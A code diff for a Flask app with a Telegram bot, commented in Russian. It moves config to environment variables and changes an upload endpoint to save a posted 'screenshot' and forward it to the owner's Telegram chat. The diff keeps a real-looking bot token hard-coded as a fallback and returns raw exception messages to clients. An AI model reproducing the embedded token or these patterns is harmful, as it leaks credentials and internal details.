@@ -11,10 +11,10 @@ from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageH
 app = Flask(__name__)
 
 # ===== КОНФИГУРАЦИЯ =====
-TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
-SECRET_KEY = "YOUR_SECRET_KEY"
+TOKEN = os.environ.get('TOKEN', "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU")
+SECRET_KEY = os.environ.get('SECRET_KEY', "DEFAULT_SECRET_KEY")
+YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', "ВАШ_CHAT_ID")
 PORT = int(os.environ.get('PORT', 5000))
-YOUR_CHAT_ID = "ВАШ_CHAT_ID"  # Замените на ваш chat ID
 # ========================
 
 bot = Bot(token=TOKEN)
@@ -87,11 +87,15 @@ def upload_file():
     file = request.files.get('file')
     if file:
         try:
-            bot.send_photo(chat_id=YOUR_CHAT_ID, photo=file)
+            # Сохраняем файл временно в памяти
+            file.save('temp_screenshot.png')
+            with open('temp_screenshot.png', 'rb') as photo:
+                bot.send_photo(chat_id=YOUR_CHAT_ID, photo=photo)
+            os.remove('temp_screenshot.png')
             return jsonify({'status': 'success'})
         except Exception as e:
             print(f"Ошибка отправки фото: {e}")
-            return jsonify({'status': 'error'}), 500
+            return jsonify({'status': 'error', 'message': str(e)}), 500
     
     return jsonify({'status': 'no_file'}), 400
 
